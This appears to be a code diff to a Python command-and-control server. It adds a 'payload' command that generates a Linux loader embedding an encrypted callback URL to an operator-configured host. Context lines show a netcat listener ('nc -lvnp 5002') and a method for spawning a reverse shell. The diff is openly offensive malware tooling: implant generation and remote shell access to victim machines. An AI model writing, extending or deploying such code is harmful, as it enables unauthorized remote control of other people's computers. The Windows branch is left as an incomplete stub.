@@ -7,6 +7,23 @@ import threading, socket, colorama, helpers,session, socketserver,select, subpro
 import random
 import encryption
 
+import json
+
+def read_config(config_filepath):
+    try:
+        with open(config_filepath, 'r') as f:
+            config_data = json.load(f)
+            return config_data
+    except FileNotFoundError:
+        print(f"Error: Config file not found at {config_filepath}")
+        return None
+    except json.JSONDecodeError:
+        print(f"Error: Invalid JSON format in {config_filepath}")
+        return None
+
+
+
+
 class server():
     def __init__(self, host='localhost', port = 5000, db='memory'):
         self.socket = self._socket(port)
@@ -16,6 +33,8 @@ class server():
         self.port = port
         self.db = db
         self.app = None
+        self.config = read_config("config.json")
+        self.url = f"http://{self.config.get("host_ip")}:5001"
         self.key = self.generate_key()
         self.threads = []
         #TODO: dockerfile
@@ -66,6 +85,11 @@ class server():
                 'method' : self._test_con,
                 'use' : 'test-con',
                 'desc' : 'tests connection to session.'
+            },
+            'payload' : {
+                'method' : self._payload,
+                'use' : 'payload < win || linux >',
+                'desc' : 'generate a payload for windows or linux'
             }
 
         
@@ -135,7 +159,15 @@ class server():
         os.system('nc -lvnp 5002')
 
         
-        
+    def _payload(self,system):
+        if system == "linux":
+            payload_path = os.path.join(os.getcwd(), 'base-loader/loader.py')
+            helpers.modify_script(payload_path,os.path.join(os.getcwd(), 'payload.py'),encryption.encrypt(self.url.encode(),self.key),self.key)
+        elif system == "win":
+            payload_path = os.path.join(os.getcwd(), 'base-loader/loader.py')
+        else:
+            helpers.show("GIVE VALID OPERATING SYSTEM (win or linux)", colour="RED", style="BRIGHT", end="\n")   
+
     
     def _shell(self):
         #spawn a reverse shell
